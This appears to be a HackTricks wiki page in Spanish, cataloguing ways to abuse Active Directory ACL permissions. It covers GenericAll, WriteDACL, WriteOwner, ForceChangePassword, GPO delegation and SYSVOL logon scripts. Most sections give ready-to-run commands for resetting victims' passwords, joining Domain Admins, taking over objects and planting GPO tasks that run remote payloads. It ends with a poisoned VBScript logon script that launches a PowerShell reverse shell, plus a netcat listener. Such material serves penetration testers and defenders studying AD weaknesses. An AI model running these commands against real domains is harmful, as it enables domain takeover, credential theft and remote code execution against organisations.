# Abuso de Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Esta página es principalmente un resumen de las técnicas de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **y** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Para más detalles, consulte los artículos originales.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Permisos sobre el usuario**

Este privilegio otorga al atacante control total sobre una cuenta de usuario objetivo. Una vez que los permisos `GenericAll` se confirman usando el comando `Get-ObjectAcl`, un atacante puede:

- **Cambiar la contraseña del objetivo**: Usando `net user <username> <password> /domain`, el atacante puede restablecer la contraseña del usuario.
- Desde Linux, puedes hacer lo mismo sobre SAMR con Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Si la cuenta está deshabilitada, borra la bandera UAC**: `GenericAll` permite editar `userAccountControl`. Desde Linux, BloodyAD puede eliminar la bandera `ACCOUNTDISABLE`:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Asignar un SPN a la cuenta del usuario para que sea kerberoastable, luego usar Rubeus y targetedKerberoast.py para extraer e intentar descifrar los hashes del ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Deshabilitar la pre-authentication para el usuario, haciendo que su cuenta sea vulnerable a ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Con `GenericAll` en un usuario puedes agregar una credencial basada en certificado y autenticarte como ese usuario sin cambiar su contraseña. Ver:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

Este privilegio permite a un atacante manipular las membresías de un grupo si tiene derechos `GenericAll` sobre un grupo como `Domain Admins`. Después de identificar el nombre distinguido del grupo con `Get-NetGroup`, el atacante puede:

- **Añadirse al grupo Domain Admins**: Esto se puede hacer mediante comandos directos o usando módulos como Active Directory o PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Desde Linux también puedes usar BloodyAD para agregarte a grupos arbitrarios cuando poseas membresía GenericAll/Write sobre ellos. Si el grupo objetivo está anidado en “Remote Management Users”, obtendrás acceso WinRM inmediatamente en hosts que respeten ese grupo:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Poseer estos privilegios en un objeto de equipo o en una cuenta de usuario permite:

- **Kerberos Resource-based Constrained Delegation**: Permite tomar control de un objeto de equipo.
- **Shadow Credentials**: Usa esta técnica para suplantar a un equipo o a una cuenta de usuario explotando los privilegios para crear Shadow Credentials.

## **WriteProperty on Group**

Si un usuario tiene derechos `WriteProperty` sobre todos los objetos de un grupo específico (p. ej., `Domain Admins`), puede:

- **Añadirse al grupo Domain Admins**: Lograble combinando los comandos `net user` y `Add-NetGroupUser`, este método permite la escalada de privilegios dentro del dominio.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) en Grupo

Este privilegio permite a los atacantes añadirse a grupos específicos, como `Domain Admins`, mediante comandos que manipulan directamente la pertenencia al grupo. Usar la siguiente secuencia de comandos permite la autoadición:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Un privilegio similar, permite a los atacantes agregarse directamente a grupos modificando las propiedades del grupo si tienen el derecho `WriteProperty` sobre esos grupos. La confirmación y ejecución de este privilegio se realizan con:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Tener el `ExtendedRight` en un usuario para `User-Force-Change-Password` permite restablecer contraseñas sin conocer la contraseña actual. La verificación de este derecho y su explotación puede realizarse mediante PowerShell u otras herramientas de línea de comandos, ofreciendo varios métodos para restablecer la contraseña de un usuario, incluidas sesiones interactivas y comandos de una sola línea para entornos no interactivos. Los comandos van desde simples invocaciones de PowerShell hasta el uso de `rpcclient` en Linux, demostrando la versatilidad de los vectores de ataque.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner en grupo**

Si un atacante descubre que tiene derechos `WriteOwner` sobre un grupo, puede cambiar la propiedad del grupo a sí mismo. Esto es particularmente impactante cuando el grupo en cuestión es `Domain Admins`, ya que cambiar la propiedad permite un control más amplio sobre los atributos y la membresía del grupo. El proceso implica identificar el objeto correcto vía `Get-ObjectAcl` y luego usar `Set-DomainObjectOwner` para modificar el owner, ya sea por SID o por nombre.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Este permiso permite a un atacante modificar las propiedades de un usuario. Específicamente, con acceso `GenericWrite`, el atacante puede cambiar la ruta del script de inicio de sesión de un usuario para ejecutar un script malicioso cuando el usuario inicie sesión. Esto se consigue usando el comando `Set-ADObject` para actualizar la propiedad `scriptpath` del usuario objetivo para que apunte al script del atacante.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Con este privilegio, los atacantes pueden manipular la pertenencia a grupos, por ejemplo agregándose a sí mismos u otros usuarios a grupos específicos. Este proceso implica crear un objeto de credencial, usarlo para agregar o eliminar usuarios de un grupo y verificar los cambios de membresía con comandos de PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Desde Linux, Samba `net` puede agregar/eliminar miembros cuando posees `GenericWrite` en el grupo (útil cuando PowerShell/RSAT no están disponibles):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Poseer un objeto AD y tener privilegios `WriteDACL` sobre él permite a un atacante concederse a sí mismo privilegios `GenericAll` sobre el objeto. Esto se logra mediante la manipulación de ADSI, permitiendo el control total del objeto y la capacidad de modificar sus membresías de grupo. A pesar de ello, existen limitaciones al intentar explotar estos privilegios usando los cmdlets `Set-Acl` / `Get-Acl` del módulo Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner toma de control rápida (PowerView)

Cuando tengas `WriteOwner` y `WriteDacl` sobre una cuenta de usuario o de servicio, puedes tomar el control total y restablecer su contraseña usando PowerView sin conocer la contraseña antigua:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notas:
- Es posible que primero necesites cambiar el propietario a ti mismo si solo tienes `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Validar el acceso con cualquier protocolo (SMB/LDAP/RDP/WinRM) después del restablecimiento de contraseña.

## **Replicación en el Dominio (DCSync)**

El ataque DCSync aprovecha permisos de replicación específicos en el dominio para hacerse pasar por un Domain Controller y sincronizar datos, incluidas las credenciales de usuario. Esta potente técnica requiere permisos como `DS-Replication-Get-Changes`, lo que permite a un atacante extraer información sensible del entorno AD sin acceso directo a un Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

El acceso delegado para gestionar Group Policy Objects (GPOs) puede presentar riesgos de seguridad significativos. Por ejemplo, si a un usuario como `offense\spotless` se le delegan derechos de gestión de GPO, puede tener privilegios como **WriteProperty**, **WriteDacl** y **WriteOwner**. Estos permisos pueden ser abusados con fines maliciosos, como se identifica usando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerar permisos de GPO

Para identificar GPOs mal configurados, se pueden encadenar los cmdlets de PowerSploit. Esto permite descubrir GPOs que un usuario específico puede gestionar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Equipos con una política determinada aplicada**: Es posible resolver a qué equipos se aplica una GPO específica, lo que ayuda a comprender el alcance del impacto potencial. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Para ver qué políticas se aplican a un equipo en particular, se pueden utilizar comandos como `Get-DomainGPO`.

**OUs con una política aplicada**: Identificar las unidades organizativas (OUs) afectadas por una política dada se puede hacer usando `Get-DomainOU`.

También puedes usar la herramienta [**GPOHound**](https://github.com/cogiceo/GPOHound) para enumerar GPOs y encontrar problemas en ellas.

### Abuse GPO - New-GPOImmediateTask

Los GPOs mal configurados pueden explotarse para ejecutar código, por ejemplo, creando una tarea programada inmediata. Esto puede usarse para añadir un usuario al grupo de administradores locales en las máquinas afectadas, elevando significativamente privilegios:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

El GroupPolicy module, si está instalado, permite la creación y el enlace de nuevos GPOs, y la configuración de preferencias como valores del registro para ejecutar backdoors en los equipos afectados. Este método requiere que el GPO se actualice y que un usuario inicie sesión en el equipo para su ejecución:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse ofrece un método para abusar de GPOs existentes añadiendo tareas o modificando ajustes sin la necesidad de crear nuevas GPOs. Esta herramienta requiere la modificación de GPOs existentes o el uso de herramientas RSAT para crear nuevas antes de aplicar cambios:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forzar actualización de políticas

Las actualizaciones de GPO normalmente ocurren aproximadamente cada 90 minutos. Para acelerar este proceso, especialmente después de implementar un cambio, se puede usar el comando `gpupdate /force` en el equipo objetivo para forzar una actualización inmediata de las políticas. Este comando asegura que cualquier modificación en las GPO se aplique sin esperar al siguiente ciclo de actualización automático.

### Bajo el capó

Al inspeccionar las Scheduled Tasks para una GPO dada, como la `Misconfigured Policy`, se puede confirmar la adición de tareas como `evilTask`. Estas tareas se crean mediante scripts o herramientas de línea de comandos con el objetivo de modificar el comportamiento del sistema o escalar privilegios.

La estructura de la tarea, como se muestra en el archivo de configuración XML generado por `New-GPOImmediateTask`, describe los detalles específicos de la tarea programada, incluyendo el comando a ejecutar y sus triggers. Este archivo representa cómo se definen y gestionan las scheduled tasks dentro de las GPO, proporcionando un método para ejecutar comandos o scripts arbitrarios como parte de la aplicación de políticas.

### Usuarios y grupos

Las GPO también permiten la manipulación de las membresías de usuarios y grupos en los sistemas objetivo. Al editar directamente los archivos de la política Users and Groups, los atacantes pueden añadir usuarios a grupos privilegiados, como el grupo local `administrators`. Esto es posible gracias a la delegación de permisos de gestión de GPO, que permite la modificación de los archivos de política para incluir nuevos usuarios o cambiar las membresías de grupos.

El archivo de configuración XML para Users and Groups describe cómo se implementan estos cambios. Al añadir entradas a este archivo, se puede otorgar privilegios elevados a usuarios específicos en los sistemas afectados. Este método ofrece un enfoque directo para la escalada de privilegios mediante la manipulación de GPO.

Además, se pueden considerar métodos adicionales para ejecutar código o mantener persistencia, como aprovechar scripts de logon/logoff, modificar claves del registro para autoruns, instalar software mediante archivos .msi o editar configuraciones de servicios. Estas técnicas proporcionan diversas vías para mantener el acceso y controlar sistemas objetivo mediante el abuso de GPO.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.

### Locate logon scripts
- Inspeccionar los atributos de usuario en busca de un script de inicio configurado:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Explorar recursos compartidos del dominio para exponer accesos directos o referencias a scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analizar archivos `.lnk` para resolver destinos que apunten a SYSVOL/NETLOGON (truco útil de DFIR y para atacantes sin acceso directo a GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound muestra el atributo `logonScript` (scriptPath) en los nodos de usuario cuando está presente.

### Validar acceso de escritura (no confíes en los listados de shares)
Las herramientas automatizadas pueden mostrar SYSVOL/NETLOGON como solo lectura, pero las ACLs de NTFS subyacentes aún pueden permitir escrituras. Siempre prueba:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Si cambia el tamaño del archivo o el mtime, tienes permisos de escritura. Conserva los originales antes de modificar.

### Poison a VBScript logon script for RCE
Añade un comando que lance un PowerShell reverse shell (genéralo desde revshells.com) y conserva la lógica original para evitar romper la función de negocio:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Escucha en tu host y espera el siguiente interactive logon:
```bash
rlwrap -cAr nc -lnvp 443
```
Notas:
- La ejecución ocurre con el token del usuario que inició sesión (no SYSTEM). El alcance es el enlace de la GPO (OU, site, domain) que aplica ese script.
- Limpiar restaurando el contenido y las marcas de tiempo originales después de su uso.

## Referencias

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

{{#include ../../../banners/hacktricks-training.md}}
